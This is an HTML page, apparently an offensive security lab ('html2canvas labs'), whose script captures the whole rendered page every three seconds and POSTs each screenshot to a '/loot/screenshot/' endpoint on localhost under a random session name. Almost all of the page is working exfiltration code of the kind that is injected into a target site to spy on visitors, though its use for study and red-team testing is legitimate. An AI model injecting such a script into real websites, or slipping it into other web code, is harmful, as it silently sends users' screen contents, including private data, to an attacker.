<head>
	<title>Labs-Screenshots</title>
</head>
<body>

	<h1>html2canvas labs</h1>
	
	<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script> -->
	<p>test content...</p>

	<script>
		alert("Ready to snag screenshot?");
	</script>


	<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
	<script>

		var sessionName = "";

		const AdjectiveList = [
			"funky",
			"smelly",
			"skunky",
			"merry",
			"whimsical",
			"amusing",
			"hysterical",
			"bumfuzzled",
			"bodacious",
			"absurd",
			"animated",
			"brazen",
			"cheesy",
			"clownish",
			"confident",
			"crazy",
			"cuckoo",
			"deranged",
			"ludicrous",
			"playful",
			"quirky",
			"screwball",
			"slapstick",
			"wacky",
			"excited",
			"humorous",
			"charming",
			"confident",
			"fanatical"
		];

		const ColorList = [
			"blue",
			"red",
			"green",
			"white",
			"black",
			"brown",
			"azure",
			"pink",
			"yellow",
			"silver",
			"purple",
			"orange",
			"grey",
			"fuchsia",
			"crimson",
			"lime",
			"plum",
			"olive",
			"cyan",
			"ivory",
			"magenta"
		];

		const MurderCritter = [
			"kangaroo",
			"koala",
			"dropbear",
			"wombat",
			"wallaby",
			"dingo",
			"emu",
			"tassiedevil",
			"platypus",
			"salty",
			"kookaburra",
			"boxjelly",
			"blueringoctopus",
			"taipan",
			"stonefish",
			"redback",
			"cassowary",
			"funnelwebspider",
			"conesnail"
		];

		function initSession()
		{
			var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
			var color = ColorList[Math.floor(Math.random()*ColorList.length)];
			var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
			sessionName = adjective + "-" + color + "-" + murderer;
		}

		function sendScreenshot()
		{
			html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
			{
				function responseHandler() 
				{
					console.log(this.responseText)
				};

				console.log("About to send image....");
				newReq = new XMLHttpRequest();newReq.addEventListener("load", responseHandler);
				newReq.open("POST", "//localhost:8444/loot/screenshot/" + sessionName);
				// newReq.setRequestHeader("Content-Type", "application/json");

				// var jsonData = new Object();
				// jsonData["session"] = sessionName;

				canvas.toBlob((blob) => 
				{
					const image = blob;
					// jsonData["screenshot"] = image;
					// var jsonString = JSON.stringify(jsonData);

					newReq.send(image);
				});
			}).catch(e => console.log(e));
		}



		console.log('Sleeping to allow resources loading!')

		initSession();
		setTimeout(function () 
		{
			setInterval(function () 
			{
				console.log("Interval...");
				console.log("Session identifier: " + sessionName);
				sendScreenshot();
			}, 3000);
		}, 3000);



	</script>

</body>